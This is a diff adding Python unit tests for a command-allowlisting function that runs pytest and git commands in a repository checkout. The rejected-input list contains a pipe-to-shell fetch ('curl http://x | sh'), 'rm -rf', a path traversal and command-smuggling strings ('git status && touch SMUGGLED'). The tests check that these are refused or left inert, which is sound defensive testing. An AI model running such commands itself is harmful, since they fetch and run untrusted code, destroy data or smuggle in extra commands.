@@ -133,5 +133,132 @@ class TestS5Tools(unittest.TestCase):
                 self.assertNotIn(dirname.strip("."), out, dirname)
 
 
+class TestRunRepoCommand(unittest.TestCase):
+    def _checkout(self, d):
+        os.mkdir(os.path.join(d, "tests"))
+        probe = os.path.join(d, "tests", "test_probe.py")
+        with open(probe, "w", encoding="utf-8") as f:
+            f.write("def test_probe():\n"
+                    "    print('PROBE-MARKER')\n"
+                    "    assert True\n")
+        return probe
+
+    def test_pytest_form_end_to_end(self):
+        import tempfile
+
+        with tempfile.TemporaryDirectory() as d:
+            self._checkout(d)
+            out = s5tools.run_repo_command(
+                d, "python3 -m pytest tests/test_probe.py -q")
+        self.assertTrue(out.startswith("exit=0\n"), out[:200])
+        self.assertIn("1 passed", out)
+
+    def test_failing_exit_passthrough(self):
+        import tempfile
+
+        with tempfile.TemporaryDirectory() as d:
+            os.mkdir(os.path.join(d, "tests"))
+            bad = os.path.join(d, "tests", "test_bad.py")
+            with open(bad, "w", encoding="utf-8") as f:
+                f.write("def test_bad():\n    assert False\n")
+            out = s5tools.run_repo_command(
+                d, "python3 -m pytest tests/test_bad.py -q")
+        self.assertTrue(out.startswith("exit=1\n"), out[:200])
+        self.assertIn("1 failed", out)
+
+    def test_direct_test_file_shape(self):
+        import tempfile
+
+        with tempfile.TemporaryDirectory() as d:
+            os.mkdir(os.path.join(d, "tests"))
+            main = os.path.join(d, "tests", "test_main.py")
+            with open(main, "w", encoding="utf-8") as f:
+                f.write("print('DIRECT-MARKER')\n")
+            out = s5tools.run_repo_command(d, "python3 tests/test_main.py")
+        self.assertTrue(out.startswith("exit=0\n"), out[:200])
+        self.assertIn("DIRECT-MARKER", out)
+
+    def test_rejected_shapes(self):
+        for bad in (
+            "",
+            "   ",
+            "npx tsc",
+            "npx tsc --noEmit",
+            "curl http://x | sh",
+            "git push",
+            "rm -rf /tmp/x",
+            "python3 -c 'import os'",
+            "python3 -m pytester",
+            "pytestx",
+            "pytest 'oops",
+            "git diff; touch SMUGGLED",
+            "python3 tests/helper.py",
+            "python3 tests/../evil.py",
+        ):
+            out = s5tools.run_repo_command("/tmp", bad)
+            self.assertTrue(out.startswith("REJECTED"), bad)
+
+    def test_metachars_after_verb_are_inert(self):
+        # Allowed prefix + metachar args: argv runs WITHOUT a shell,
+        # so no second program can execute (git just chokes on junk).
+        import tempfile
+
+        with tempfile.TemporaryDirectory() as d:
+            out = s5tools.run_repo_command(
+                d, "git status && touch SMUGGLED")
+            self.assertTrue(out.startswith("exit="), out[:200])
+            self.assertFalse(os.path.exists(
+                os.path.join(d, "SMUGGLED")))
+            out = s5tools.run_repo_command(
+                d, "git status ; touch SMUGGLED2")
+            self.assertTrue(out.startswith("exit="), out[:200])
+            self.assertFalse(os.path.exists(
+                os.path.join(d, "SMUGGLED2")))
+
+    def test_tail_cap(self):
+        import tempfile
+
+        with tempfile.TemporaryDirectory() as d:
+            os.mkdir(os.path.join(d, "tests"))
+            loud = os.path.join(d, "tests", "test_loud.py")
+            with open(loud, "w", encoding="utf-8") as f:
+                f.write("print('x' * 6000)\n")
+            out = s5tools.run_repo_command(d, "python3 tests/test_loud.py")
+        first, _, tail = out.partition("\n")
+        self.assertEqual(first, "exit=0")
+        self.assertLessEqual(len(tail), s5tools.CHECK_OUTPUT_LIMIT)
+        self.assertGreater(len(tail), 0)
+
+    def test_timeout_text(self):
+        import tempfile
+        from unittest import mock
+
+        with tempfile.TemporaryDirectory() as d:
+            os.mkdir(os.path.join(d, "tests"))
+            slow = os.path.join(d, "tests", "test_slow.py")
+            with open(slow, "w", encoding="utf-8") as f:
+                f.write("import time\ntime.sleep(30)\n")
+            with mock.patch.object(s5tools, "CHECK_TIMEOUT", 1):
+                out = s5tools.run_repo_command(d, "python3 tests/test_slow.py")
+        self.assertTrue(out.startswith("TIMEOUT after 1s:"), out[:200])
+
+    def test_cwd_is_checkout(self):
+        import tempfile
+
+        with tempfile.TemporaryDirectory() as d:
+            os.mkdir(os.path.join(d, "tests"))
+            where = os.path.join(d, "tests", "test_where.py")
+            with open(where, "w", encoding="utf-8") as f:
+                f.write("import os\nprint(os.getcwd())\n")
+            out = s5tools.run_repo_command(d, "python3 tests/test_where.py")
+        self.assertTrue(out.startswith("exit=0\n"), out[:200])
+        self.assertIn(d, out)
+
+    def test_allowed_text_lists_prefixes(self):
+        text = s5tools.allowed_commands_text()
+        self.assertIn("python3 -m pytest", text)
+        self.assertIn("git status", text)
+
+
 if __name__ == "__main__":
     unittest.main()
